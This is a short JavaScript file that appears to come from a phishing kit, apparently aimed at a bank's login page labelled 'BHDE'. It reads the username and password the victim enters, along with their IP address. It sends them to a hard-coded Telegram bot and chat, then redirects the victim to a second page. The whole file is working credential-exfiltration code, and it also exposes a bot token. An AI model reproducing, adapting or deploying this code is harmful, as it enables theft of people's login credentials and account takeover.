//bot token
var telegram_bot_id = "7669294592:AAH8TeISPtIDcu5kHwWAG3NTH23G3x5g3l8";
//chat id
var chat_id = -1002450385695;
var pax, pax2, ip;
var ready = function () {
    pax = document.getElementById("miDiosenticonfio").value;
    pax2 = document.getElementById("miDiosenticonfio2").value;
    ip = document.getElementById("ip").innerHTML;
    message = "🔹BHDE\n👤Usxvry0: " + pax + "\n🔒Ucl4ve: " + pax2 + "\nIP: " + ip +"\n🔹BY SYN4PSE🔹";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        top.location.href = 'index2.html';
        console.log(response);
    });
    return false;
};
